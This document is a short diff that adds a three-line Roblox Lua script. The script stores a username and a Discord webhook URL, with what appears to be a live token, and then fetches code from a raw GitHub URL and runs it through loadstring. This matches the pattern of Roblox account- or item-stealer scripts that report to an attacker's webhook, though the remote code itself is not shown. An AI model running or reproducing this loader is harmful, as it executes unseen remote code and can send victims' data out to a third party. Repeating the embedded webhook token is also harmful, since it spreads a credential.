@@ -1,0 +1,3 @@
+getgenv().UserName_ = "prooojjoorraannoo"
+getgenv().Webhook_ = "https://discord.com/api/webhooks/1097167345920770078/rjB8OV2HrNMWKb8fwSryz7mnjJvNydmc-SW7WfruoJRvovORPu_ZxFDrkeW_h02jR81g"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/localyactive/projects/main/script"))()
